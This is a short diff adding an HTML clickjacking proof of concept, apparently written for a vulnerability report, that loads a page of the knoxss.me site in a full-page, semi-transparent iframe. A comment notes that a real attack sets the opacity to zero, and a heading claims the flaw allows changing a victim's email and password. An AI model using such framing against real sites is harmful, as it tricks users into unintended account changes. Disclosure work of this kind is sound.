@@ -1,0 +1,20 @@
+<html>
+<title>CLICKJACKING POC</title>
+<head>
+<body>
+<h1>This can be exploited to change email address,account password and other user details</h1>
+<style>
+iframe { /* iframe from the victim site */
+  width: 100%;
+  height: 100%;
+  position: absolute;
+  top:0; left:0px;
+  opacity: 0.25; /* in real opacity:0 */
+  z-index: 1;
+}
+</style>
+<iframe src="https://knoxss.me/?page_id=252"></iframe>
+</body>
+</head>
+
+</html>
